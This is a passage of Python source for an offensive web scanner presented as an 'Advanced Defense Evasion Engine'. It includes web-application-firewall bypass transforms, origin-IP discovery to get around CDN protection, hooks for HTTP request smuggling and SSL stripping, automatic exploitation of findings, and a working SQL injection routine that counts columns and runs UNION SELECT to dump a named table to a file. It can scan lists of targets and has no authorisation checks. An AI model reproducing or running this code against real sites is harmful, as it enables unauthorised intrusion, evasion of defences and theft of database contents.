                async with self.session.get(url, params={'test': test_payload}, timeout=5) as response:
                    if response.status in [403, 406] or "blocked" in (await response.text()).lower():
                        rule_findings.append(f"Blocked: {keyword} (Status: {response.status})")
                    else:
                        rule_findings.append(f"Allowed: {keyword} (Status: {response.status})")
            except Exception:
                pass
        
        if rule_findings:
            print(Fore.CYAN + "[*] WAF Rule Discovery Findings:")
            for finding in rule_findings:
                print(f"    - {finding}")
        return rule_findings

    async def bypass_waf(self, original_payload):
        if not self.identified_waf:
            return original_payload 
        
        print(Fore.CYAN + f"[*] Attempting WAF bypass for {self.identified_waf} with payload: {original_payload[:50]}...")
        
        bypass_techniques = [
            lambda s: s.lower(), 
            lambda s: s.upper(), 
            lambda s: s.replace(' ', '/**/'), 
            lambda s: urllib.parse.quote(s, safe=''), 
            lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''), 
            lambda s: s.replace(' ', '%0a'), 
            lambda s: s + '%00', 
            lambda s: s.replace('script', 'scri%00pt'), 
            lambda s: s.replace('script', 'scr<script>ipt') 
        ]

        best_bypass_payload = original_payload
        best_bypass_score = 0

        for _ in range(10): 
            current_bypassed_payload = original_payload
            num_techniques = random.randint(1, len(bypass_techniques))
            techniques_to_apply = random.sample(bypass_techniques, num_techniques)

            for tech in techniques_to_apply:
                current_bypassed_payload = tech(current_bypassed_payload)
            
            return current_bypassed_payload
        
        return original_payload 

class OriginIPDiscoveryModule:
    def __init__(self, session):
        self.session = session

    async def discover_origin_ip(self, domain):
        print(Fore.CYAN + f"[*] Attempting to discover origin IP for {domain}...")
        
        print(Fore.BLUE + "[*] Checking DNS history (conceptual - requires external API or large historical DB)...")
        historical_ips = [] 

        print(Fore.BLUE + "[*] Scanning common subdomains...")
        common_subdomains = ["dev", "ftp", "mail", "admin", "cpanel", "blog", "test"]
        found_ips = set()
        
        for sub in common_subdomains:
            test_domain = f"{sub}.{domain}"
            try:
                answers = await asyncio.to_thread(dns.resolver.resolve, test_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if ip not in found_ips:
                        found_ips.add(ip)
                        print(Fore.GREEN + f"[+] Subdomain '{test_domain}' resolved to: {ip}")
            except dns.resolver.NXDOMAIN:
                pass
            except Exception as e:
                pass 

        print(Fore.BLUE + "[*] Checking SSL certificates for exposed IPs (conceptual - advanced TLS parsing needed)...")
        
        print(Fore.BLUE + "[*] Checking for exposed IPs in email headers/comments (manual/conceptual)...")

        all_potential_ips = list(set(historical_ips) | found_ips)
        if all_potential_ips:
            print(Fore.GREEN + f"[+] Potential origin IPs found: {', '.join(all_potential_ips)}")
            
            for ip in all_potential_ips:
                try:
                    test_url = f"http://{ip}" if "http://" in domain or "https://" in domain else f"http://{ip}"
                    print(Fore.BLUE + f"[*] Verifying IP {ip} by direct connection...")
                    async with self.session.get(test_url, headers={'Host': domain}, allow_redirects=True, timeout=10) as response:
                        if response.status == 200:
                            print(Fore.GREEN + f"[+] IP {ip} serves content for {domain}. Likely origin IP found!")
                            return ip
                except Exception as e:
                    print(Fore.YELLOW + f"[-] Failed to verify IP {ip}: {e}")
        else:
            print(Fore.YELLOW + "[-] No potential origin IPs discovered.")
        
        return None

class Reporter:
    @staticmethod
    def print_banner():
        banner = f"""{Fore.GREEN}
        ████████╗███████╗███████╗███████╗██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗███████╗
        ╚══██╔══╝██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
           ██║   █████╗  ███████╗█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  ███████╗
           ██║   ██╔══╝  ╚════██║██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══╝  ╚════██║
           ██║   ███████╗███████║███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████║
           ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
        {Style.RESET_ALL}"""
        print(banner)
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Project Prometheus (WebMer v5.0) - Advanced Defense Evasion Engine")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}  Developed by Anas Erami")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

    @staticmethod
    def generate_report(tech_stack, vulnerabilities, target, scan_time, defense_bypass_info=None):
        report = [
            f"# Project Prometheus Security Report - {target}",
            f"**Scan Date**: {time.ctime()}  \n**Scan Duration**: {scan_time:.2f} seconds\n",
            "## Technology Stack\n```json"
        ]
        
        report.append(json.dumps(tech_stack, indent=2))
            
        if defense_bypass_info:
            report.append("```\n## Defense Evasion & Bypass Information\n")
            if defense_bypass_info.get('waf_identification'):
                report.append(f"- **WAF Identified**: `{defense_bypass_info['waf_identification']}`")
                if defense_bypass_info.get('waf_rules'):
                    report.append("- **WAF Rule Discovery Findings**:")
                    for rule in defense_bypass_info['waf_rules']:
                        report.append(f"  - `{rule}`")
            if defense_bypass_info.get('origin_ip'):
                report.append(f"- **Origin IP Discovered**: `{defense_bypass_info['origin_ip']}`")
            if defense_bypass_info.get('ssl_stripping_attempt'):
                report.append(f"- **SSL Stripping Attempted**: `{defense_bypass_info['ssl_stripping_attempt']}`")
                report.append(f"  (Note: SSL Stripping requires a Man-in-the-Middle position and is a complex attack.)")
            if defense_bypass_info.get('http_smuggling_attempt'):
                report.append(f"- **HTTP Request Smuggling Attempted**: `{defense_bypass_info['http_smuggling_attempt']}`")
                report.append(f"  (Note: Requires an active mitmproxy instance configured for smuggling via 'X-Smuggling-Payload' header.)")


        report.append("\n## Vulnerabilities\n")
        
        if not vulnerabilities:
            report.append("No vulnerabilities found")
        else:
            for i, vuln in enumerate(vulnerabilities, 1):
                report.append(f"### Vulnerability #{i}")
                report.append(f"- **Type**: `{vuln['type']}`")
                report.append(f"- **URL**: `{vuln['url']}`")
                report.append(f"- **Parameter**: `{vuln['param']}`")
                report.append(f"- **Payload**: `{vuln['payload']}`")
                report.append(f"- **Status Code**: `{vuln['status']}`")
                report.append(f"- **Response Length**: `{vuln['length']}`")
                report.append(f"- **Evidence**: `{vuln['evidence']}`")
                report.append(f"- **Proof of Concept**:")
                report.append(f"```{vuln['poc']}```")
                
                confidence_level = "Low"
                if vuln['confidence'] >= 0.9:
                    confidence_level = f"{Fore.RED}High{Style.RESET_ALL}"
                elif vuln['confidence'] >= 0.7:
                    confidence_level = f"{Fore.YELLOW}Medium{Style.RESET_ALL}"
                else:
                    confidence_level = f"{Fore.CYAN}Low{Style.RESET_ALL}"
                report.append(f"- **Confidence**: {confidence_level}")
                report.append("---")
        
        return "\n".join(report)

    @staticmethod
    def print_summary(vulnerabilities, scan_time):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Scan Summary")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  Scan Duration: {scan_time:.2f} seconds")
        
        vuln_count = {
            'SQLiModule': 0,
            'XSSModule': 0,
            'HeaderFuzzModule': 0,
            'URLPathFuzzModule': 0,
            'SmugglingModule': 0, 
            'Other': 0
        }
        
        for vuln in vulnerabilities:
            if vuln['type'] == 'SQLiModule':
                vuln_count['SQLiModule'] += 1
            elif vuln['type'] == 'XSSModule':
                vuln_count['XSSModule'] += 1
            elif vuln['type'] == 'HeaderFuzzModule':
                vuln_count['HeaderFuzzModule'] += 1
            elif vuln['type'] == 'URLPathFuzzModule':
                vuln_count['URLPathFuzzModule'] += 1
            elif vuln['type'] == 'SmugglingModule':
                vuln_count['SmugglingModule'] += 1
            else:
                vuln_count['Other'] += 1
        
        print(f"{Fore.GREEN}  SQL Injection: {vuln_count['SQLiModule']}")
        print(f"{Fore.GREEN}  Cross-Site Scripting (XSS): {vuln_count['XSSModule']}")
        print(f"{Fore.GREEN}  Header Fuzzing: {vuln_count['HeaderFuzzModule']}")
        print(f"{Fore.GREEN}  URL Path Fuzzing: {vuln_count['URLPathFuzzModule']}")
        print(f"{Fore.GREEN}  HTTP Request Smuggling: {vuln_count['SmugglingModule']}")
        print(f"{Fore.GREEN}  Other: {vuln_count['Other']}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

class WebMerScanner:
    def __init__(self, args):
        self.args = args
        self.brain = QLearningBrain()
        
        self.initial_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
                
        self.connector = aiohttp.TCPConnector(ssl=ssl_context, limit=self.args.concurrency)
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            headers=self.initial_headers,
            cookies=self._parse_cookies(args.cookies) if args.cookies else None,
            proxy=args.proxy if args.proxy else None
        )
        
        self.verbose = args.verbose
        self.recon = ReconEngine(self.session) 

    def _parse_cookies(self, cookie_string):
        cookies = {}
        for cookie in cookie_string.split(';'):
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()
        return cookies

    async def scan_target(self, target):
        start_time = time.time()
        session_file_name = urllib.parse.urlparse(target).netloc.replace('.', '_') + ".json"
        session_path = os.path.join("sessions", session_file_name)
        
        recon_data = None
        if self.args.resume and os.path.exists(session_path):
            print(Fore.BLUE + f"[*] Resuming session from {session_path}...")
            try:
                with open(session_path, 'r') as f:
                    session_data = json.load(f)
                    recon_data = session_data.get('recon_data')
                    
                    self.recon.endpoints = set(recon_data.get('endpoints', []))
                    self.recon.parameters = {k: [dict(t) for t in v] for k, v in recon_data.get('parameters', {}).items()} 
                    self.recon.js_files = set(recon_data.get('js_files', []))
                    self.recon.robots = recon_data.get('robots', [])
                    self.recon.sitemap = recon_data.get('sitemap', [])
                    self.recon.processed_urls = set(recon_data.get('processed_urls', []))
                    
                    if self.verbose:
                        print(Fore.GREEN + f"[+] Loaded {len(self.recon.endpoints)} endpoints from session.")
            except Exception as e:
                print(Fore.RED + f"[!] Failed to load session from {session_path}: {e}. Starting new scan.")
                recon_data = None 

        if recon_data is None:
            if self.verbose:
                print(Fore.CYAN + f"[*] Crawling: {target}")
            self.recon = ReconEngine(self.session)
            await self.recon.crawl(target)
        
        if self.verbose:
            print(Fore.GREEN + f"[+] Found {len(self.recon.endpoints)} endpoints")
            print(Fore.GREEN + f"[+] Found {sum(len(v) for v in self.recon.parameters.values())} forms")
        
        if self.verbose:
            print(Fore.CYAN + "[*] Fingerprinting technology stack...")
        fingerprinter = FingerprintEngine(target, self.session)
        tech_stack = await fingerprinter.fingerprint()
        
        defense_bypass_info = {}
        if self.verbose:
            print(Fore.GREEN + "[+] Technology stack identified:")
            for tech, details in tech_stack.items():
                print(f"  - {tech}: {details}")
            if GLOBAL_WAF_DETECTED:
                print(Fore.RED + "[!] WAF detected! Activating adaptive mode for fuzzing.")
        
        waf_bypass_module = WAFBypassModule(self.session)
        identified_waf = await waf_bypass_module.identify_waf(target)
        if identified_waf:
            defense_bypass_info['waf_identification'] = identified_waf
            waf_rules = await waf_bypass_module.discover_waf_rules(target)
            if waf_rules:
                defense_bypass_info['waf_rules'] = waf_rules

        origin_ip_module = OriginIPDiscoveryModule(self.session)
        parsed_url = urllib.parse.urlparse(target)
        origin_ip = await origin_ip_module.discover_origin_ip(parsed_url.netloc)
        if origin_ip:
            defense_bypass_info['origin_ip'] = origin_ip
            print(Fore.GREEN + f"[+] Discovered Origin IP: {origin_ip}. Future attacks can target this IP directly.")

        if self.args.ssl_strip:
            defense_bypass_info['ssl_stripping_attempt'] = "Initiated (requires external MITM setup)"
            print(Fore.YELLOW + "[!] SSL Stripping initiated. This requires WebMer to be in a Man-in-the-Middle position.")
            print(Fore.YELLOW + "    (Conceptual: Full MITM integration with mitmproxy is highly complex and not implemented directly in this single file.)")

        if self.args.http_smuggle and self.args.proxy:
             print(Fore.YELLOW + "[!] HTTP Request Smuggling tests enabled. Ensure mitmproxy is running as proxy and configured for smuggling.")
             defense_bypass_info['http_smuggling_attempt'] = "Enabled via mitmproxy interaction"
        elif self.args.http_smuggle and not self.args.proxy:
             print(Fore.RED + "[!] HTTP Request Smuggling requires a proxy (like mitmproxy) to be specified with --proxy.")


        fuzzer = Fuzzer(self.session, self.brain, waf_detected=GLOBAL_WAF_DETECTED, concurrency=self.args.concurrency)
        all_detected_vulnerabilities = []

        if self.args.api_spec:
            api_module = APIModule(self.session)
            await api_module.load_spec(self.args.api_spec)
            if api_module.endpoints:
                print(Fore.CYAN + f"[*] Starting API Fuzzing for {len(api_module.endpoints)} endpoints...")
                api_fuzzing_results = await api_module.fuzz_api_endpoints(fuzzer.modules, self.initial_headers, fuzzer.get_baseline_response, tech_stack, self.brain)
                all_detected_vulnerabilities.extend(api_fuzzing_results)
            else:
                print(Fore.YELLOW + "[!] No API endpoints found in the provided specification.")
        else: 
            if self.verbose:
                print(Fore.CYAN + f"[*] Fuzzing {sum(len(v) for v in self.recon.parameters.values())} parameters and headers...")
            
            fuzzing_tasks = []
            for endpoint, forms in self.recon.parameters.items():
                for form_data in forms:
                    fuzzing_tasks.append(fuzzer.fuzz(endpoint, form_data, self.initial_headers, tech_stack))
            
            fuzzer_results = await asyncio.gather(*fuzzing_tasks)
            for res_list in fuzzer_results:
                all_detected_vulnerabilities.extend(res_list)

        if self.verbose:
            print(Fore.CYAN + "[*] Exploiting and verifying vulnerabilities...")
        
        final_vulnerabilities = []
        exploit_tasks = []
        for vuln_data in all_detected_vulnerabilities:
            module_name = vuln_data['type']
            for module in fuzzer.modules:
                if module.__class__.__name__ == module_name:
                    form_data = next(
                        (form for form in self.recon.parameters.get(vuln_data['url'], []) 
                         if vuln_data['param'] and vuln_data['param'].replace('Header: ', '') in form['params']),
                        None
                    ) or {'method': 'get', 'params': {}}
                    
                    param_for_exploit = vuln_data['param'] if vuln_data['param'] != 'N/A' else None
                    if param_for_exploit and "Header: " in param_for_exploit:
                         param_for_exploit = param_for_exploit.replace("Header: ", "")
                    elif module_name == 'SmugglingModule':
                        param_for_exploit = "HTTP_Request_Smuggling_Context" 

                    exploit_tasks.append(
                        module.exploit(
                            self.session,
                            vuln_data['url'],
                            param_for_exploit,
                            vuln_data['payload'],
                            form_data['method'],
                            form_data['params']
                        )
                    )
                    break
        
        exploit_results = await asyncio.gather(*exploit_tasks)
        for i, (poc, confidence) in enumerate(exploit_results):
            vuln_data = all_detected_vulnerabilities[i]
            vuln_data['poc'] = poc
            vuln_data['confidence'] = confidence
            final_vulnerabilities.append(vuln_data)
        
        scan_time = time.time() - start_time
        report = Reporter.generate_report(tech_stack, final_vulnerabilities, target, scan_time, defense_bypass_info)
        
        if self.args.output:
            filename = self.args.output
            if self.args.list:
                filename = f"{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{filename}"
                
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report)
            print(Fore.GREEN + f"[+] Report saved to {filename}")

        os.makedirs("sessions", exist_ok=True)
        session_data = {
            'target': target,
            'scan_time': time.ctime(),
            'recon_data': {
                'endpoints': list(self.recon.endpoints),
                'parameters': {k: [dict(t) for t in v] for k, v in self.recon.parameters.items()}, 
                'js_files': list(self.recon.js_files),
                'robots': self.recon.robots,
                'sitemap': self.recon.sitemap,
                'processed_urls': list(self.recon.processed_urls)
            },
            'tech_stack': tech_stack,
            'vulnerabilities': final_vulnerabilities,
            'defense_bypass_info': defense_bypass_info
        }
        with open(session_path, 'w', encoding='utf-8') as f:
            json.dump(session_data, f, indent=4)
        print(Fore.GREEN + f"[+] Session saved to {session_path}")
        
        Reporter.print_summary(final_vulnerabilities, scan_time)
        
        return final_vulnerabilities

def run_scanner_process(target, args_dict, brain_file):
    async def _scan():
        local_args = argparse.Namespace(**args_dict)
        local_args.output = f"report_{target.replace('://', '_').replace('/', '_')}.md" 

        scanner = WebMerScanner(local_args)
        scanner.brain.brain_file = brain_file 
        try:
            await scanner.scan_target(target)
        finally:
            await scanner.session.close()

    asyncio.run(_scan())

def open_new_terminal(command, title="Cerebrus Process"):
    try:
        if os.environ.get('TMUX'):
            subprocess.Popen(['tmux', 'new-window', '-n', title, command])
        elif 'GNOME_TERMINAL_SCREEN' in os.environ:
            subprocess.Popen(['gnome-terminal', '--title', title, '--', 'bash', '-c', command + '; exec bash'])
        elif os.name == 'posix':
            subprocess.Popen(['xterm', '-title', title, '-e', command + '; bash'])
        elif os.name == 'nt':
            subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
        else:
            print(Fore.YELLOW + "[!] Cannot open new terminal. Please run the command manually: " + command)
            return False
        return True
    except FileNotFoundError:
        print(Fore.RED + f"[!] Terminal command not found. Please ensure 'tmux'/'gnome-terminal'/'xterm'/'start' is in your PATH.")
        return False
    except Exception as e:
        print(Fore.RED + f"[!] Failed to open new terminal: {e}")
        return False


async def main():
    parser = argparse.ArgumentParser(description='Project Prometheus (WebMer v5.0) - Advanced Defense Evasion Engine')
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('--list', help='File containing list of targets')
    parser.add_argument('-c', '--cookies', help='Session cookies (e.g., "ID=123; role=user")')
    parser.add_argument('-o', '--output', help='Output report filename')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--concurrency', type=int, default=50, help='Number of concurrent requests')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--resume', action='store_true', help='Resume a previous scan')
    parser.add_argument('--dump', help='Attempt to dump a table from an SQLi vulnerability')
    parser.add_argument('--api-spec', help='Path to an OpenAPI/Swagger specification file')
    parser.add_argument('--multi-process', type=int, nargs='?', const=os.cpu_count(), default=0, help='Enable multiprocessing. Optionally specify number of processes.')
    parser.add_argument('--multi-terminal', action='store_true', help='Open new terminals for certain operations')
    parser.add_argument('--ssl-strip', action='store_true', help='Conceptual SSL Stripping (requires MITM setup)')
    parser.add_argument('--http-smuggle', action='store_true', help='Enable HTTP Request Smuggling tests (requires proxy)')
    
    args = parser.parse_args()

    if not args.url and not args.list and not args.api_spec:
        print(Fore.RED + "[!] Please specify either --url, --list, or --api-spec")
        return
        
    Reporter.print_banner()
    
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        with open(args.list, 'r') as f:
            targets.extend([line.strip() for line in f.readlines() if line.strip()])
    
    if args.api_spec and not args.url: 
        targets.append("api_scan_target") 

    if args.multi_process and args.list and len(targets) > 1:
        print(Fore.BLUE + f"[*] Starting multiprocessing scan for {len(targets)} targets...")
        process_pool_args = []
        brain_file = "brain.json" 
        for target_url in targets:
            args_dict = vars(args)
            args_dict['url'] = target_url 
            args_dict['list'] = None 
            process_pool_args.append((target_url, args_dict, brain_file))

        with concurrent.futures.ProcessPoolExecutor() as executor:
            executor.map(run_scanner_process, *zip(*process_pool_args)) 
        
        print(Fore.GREEN + "\n[+] All multiprocessing scans completed.")
    else:
        scanner = WebMerScanner(args)
        all_vulnerabilities = []
        
        for target in targets:
            print(Fore.BLUE + f"\n[*] Scanning target: {target}")
            vulnerabilities = await scanner.scan_target(target)
            all_vulnerabilities.extend(vulnerabilities)
            
            if args.dump and args.url == target: 
                sqli_vulns = [v for v in vulnerabilities if v['type'] == 'SQLiModule' and v['confidence'] >= 0.8]
                if sqli_vulns:
                    dump_cmd = f"python3 {os.path.abspath(__file__)} --url {target} --dump {args.dump} --verbose" 
                    if args.proxy:
                        dump_cmd += f" --proxy {args.proxy}"
                    
                    if args.multi_terminal:
                        print(Fore.YELLOW + f"[*] Opening new terminal for SQLi data dump...")
                        open_new_terminal(dump_cmd, f"Cerebrus - SQLi Dump {args.dump}")
                    else:
                        print(Fore.YELLOW + f"[*] Attempting to dump data from table '{args.dump}' using identified SQLi vulnerability (in current terminal)...")
                        sqli_module_instance = SQLiModule()
                        for vuln in sqli_vulns:
                            try:
                                num_columns = 0
                                for i in range(1, 20): 
                                    order_by_payload = vuln['payload'].replace("--", "") + f" ORDER BY {i}--"
                                    test_params = {}
                                    if vuln['param'] and vuln['param'] != 'N/A':
                                        test_params = {vuln['param']: order_by_payload}
                                    
                                    try:
                                        if vuln['method'] == 'get':
                                            async with scanner.session.get(vuln['url'], params=test_params, timeout=5) as response:
                                                if response.status == 200:
                                                    num_columns = i
                                                else:
                                                    break
                                        else:
                                            async with scanner.session.post(vuln['url'], data=test_params, timeout=5) as response:
                                                if response.status == 200:
                                                    num_columns = i
                                                else:
                                                    break
                                    except Exception:
                                        break
                                if num_columns > 0:
                                    union_cols = ','.join(['NULL'] * (num_columns - 1) + [f"GROUP_CONCAT({args.dump}.*, 0x3a)"]) 
                                    dump_payload = vuln['payload'].replace("--", "") + f" UNION SELECT {union_cols} FROM {args.dump} --"
                                    
                                    test_params = {}
                                    if vuln['param'] and vuln['param'] != 'N/A':
                                        test_params = {vuln['param']: dump_payload}

                                    if vuln['method'] == 'get':
                                        async with scanner.session.get(vuln['url'], params=test_params, timeout=20) as response:
                                            dump_content = await response.text()
                                    else:
                                        async with scanner.session.post(vuln['url'], data=test_params, timeout=20) as response:
                                            dump_content = await response.text()

                                    if response.status == 200 and "Error" not in dump_content and "syntax" not in dump_content:
                                        dump_filename = f"dump_{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{args.dump}.txt"
                                        with open(dump_filename, 'w', encoding='utf-8') as f:
                                            f.write(dump_content)
                                        print(Fore.GREEN + f"[+] Data from table '{args.dump}' potentially dumped to {dump_filename}")
                                        print(Fore.CYAN + "    (Note: Manual review of the dump file is highly recommended as content may vary based on column count and display.)")
                                    else:
                                        print(Fore.RED + f"[!] Failed to dump data from table '{args.dump}' for {vuln['url']}. Response status: {response.status}")
                                else:
                                    print(Fore.RED + f"[!] Could not determine column count for SQLi dump on {vuln['url']}. Skipping dump.")
                            except Exception as e:
                                print(Fore.RED + f"[!] Error during data dump attempt: {e}")
                else:
                    print(Fore.YELLOW + "[!] No high-confidence SQLi vulnerabilities found to attempt data dumping.")
            
            await asyncio.sleep(args.delay)
        
        await scanner.session.close()
        
        print(Fore.GREEN + f"\n[+] Total vulnerabilities found across all targets: {len(all_vulnerabilities)}")

def main_entry():
    """The synchronous entry point for the command line."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user.")
    except SystemExit:
        pass
    except Exception as e:
        print(f"\n{Fore.RED}[!] A critical top-level error occurred: {e}")

if __name__ == "__main__":
    main_entry()
